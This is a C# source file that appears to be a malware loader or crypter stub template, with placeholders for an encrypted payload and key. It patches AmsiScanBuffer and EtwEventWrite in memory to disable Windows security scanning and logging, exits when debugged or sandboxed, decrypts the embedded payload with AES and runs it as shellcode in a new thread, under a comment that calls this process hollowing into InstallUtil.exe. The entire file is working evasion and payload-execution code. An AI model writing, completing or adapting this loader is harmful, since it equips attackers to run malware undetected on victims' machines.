using System;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

class Program
{
    static byte[] ENCRYPTED_PAYLOAD = /* PAYLOAD_PLACEHOLDER */;
    static byte[] ENCRYPTION_KEY = /* KEY_PLACEHOLDER */;
    /* JUNK_PLACEHOLDER */

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main()
    {
        // AMSI Bypass
        BypassAMSI();

        // ETW Bypass
        BypassETW();

        // Anti-checks
        if (Debugger.IsAttached || Environment.ProcessorCount < 2)
            Environment.Exit(0);

        Thread.Sleep(2000);

        try
        {
            byte[] decrypted = Decrypt(ENCRYPTED_PAYLOAD, ENCRYPTION_KEY);
            
            // Process Hollowing to InstallUtil.exe
            string target = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe";
            if (!File.Exists(target))
                target = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe";

            ProcessHollowing(target, decrypted);
            Thread.Sleep(Timeout.Infinite);
        }
        catch
        {
            Environment.Exit(1);
        }
    }

    static void BypassAMSI()
    {
        try
        {
            IntPtr amsi = LoadLibrary("amsi.dll");
            IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");

            if (amsiScanBuffer != IntPtr.Zero)
            {
                uint oldProtect;
                VirtualProtect(amsiScanBuffer, 5, PAGE_EXECUTE_READWRITE, out oldProtect);

                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
                Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);

                VirtualProtect(amsiScanBuffer, 5, oldProtect, out oldProtect);
            }
        }
        catch { }
    }

    static void BypassETW()
    {
        try
        {
            IntPtr ntdll = LoadLibrary("ntdll.dll");
            IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");

            if (etwEventWrite != IntPtr.Zero)
            {
                uint oldProtect;
                VirtualProtect(etwEventWrite, 4, PAGE_EXECUTE_READWRITE, out oldProtect);

                byte[] patch = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax, rax; ret
                Marshal.Copy(patch, 0, etwEventWrite, patch.Length);

                VirtualProtect(etwEventWrite, 4, oldProtect, out oldProtect);
            }
        }
        catch { }
    }

    static byte[] Decrypt(byte[] data, byte[] key)
    {
        using (var aes = new AesManaged())
        {
            aes.Key = key;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            byte[] iv = new byte[16];
            Buffer.BlockCopy(data, 0, iv, 0, 16);
            aes.IV = iv;

            using (var decryptor = aes.CreateDecryptor())
            using (var ms = new MemoryStream(data, 16, data.Length - 16))
            using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
            using (var result = new MemoryStream())
            {
                cs.CopyTo(result);
                return result.ToArray();
            }
        }
    }

    static void ProcessHollowing(string targetPath, byte[] payload)
    {
        // Simplified hollowing - real implementation would use full PE injection
        ProcessStartInfo si = new ProcessStartInfo(targetPath)
        {
            UseShellExecute = false,
            CreateNoWindow = true
        };

        Process proc = Process.Start(si);
        proc.Suspend();

        // In real implementation: NtUnmapViewOfSection, WriteProcessMemory, etc.
        // For demonstration, just create thread in current process
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40);
        Marshal.Copy(payload, 0, addr, payload.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}

static class ProcessExtensions
{
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll")]
    static extern uint SuspendThread(IntPtr hThread);

    public static void Suspend(this Process process)
    {
        foreach (ProcessThread thread in process.Threads)
        {
            IntPtr pOpenThread = OpenThread(2, false, (uint)thread.Id);
            if (pOpenThread != IntPtr.Zero)
                SuspendThread(pOpenThread);
        }
    }
}
